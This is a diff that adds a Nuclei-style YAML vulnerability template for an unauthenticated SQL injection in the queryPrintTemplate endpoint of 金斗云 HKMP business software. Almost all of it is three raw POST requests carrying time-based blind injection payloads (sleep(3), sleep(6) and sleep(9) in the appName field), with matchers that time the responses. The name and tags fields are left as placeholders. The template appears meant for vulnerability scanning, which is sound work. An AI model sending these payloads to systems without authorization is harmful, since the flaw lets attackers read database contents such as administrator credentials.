@@ -1,0 +1,45 @@
+id: jindouyun-queryPrintTemplate-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 金斗云HKMP智慧商业软件queryPrintTemplate存在SQL注入漏洞，未经身份验证攻击者可通过该漏洞数据库数据，如管理员账户密码等。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E6%96%97%E4%BA%91HKMP%E6%99%BA%E6%85%A7%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6queryPrintTemplate%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /admin/configApp/queryPrintTemplate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: application/json
+        Content-Length: 284
+
+        {"appId":"hkmp","data":{"adminUserCode":"test1234","adminUserName":"test1234","appName":"悟空POS Win版' AND (SELECt 5 from (select(sleep(3)))x) and 'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}
+      - |-
+        POST /admin/configApp/queryPrintTemplate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: application/json
+        Content-Length: 284
+
+        {"appId":"hkmp","data":{"adminUserCode":"test1234","adminUserName":"test1234","appName":"悟空POS Win版' AND (SELECt 5 from (select(sleep(6)))x) and 'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}
+      - |-
+        POST /admin/configApp/queryPrintTemplate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: application/json
+        Content-Length: 284
+
+        {"appId":"hkmp","data":{"adminUserCode":"test1234","adminUserName":"test1234","appName":"悟空POS Win版' AND (SELECt 5 from (select(sleep(9)))x) and 'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
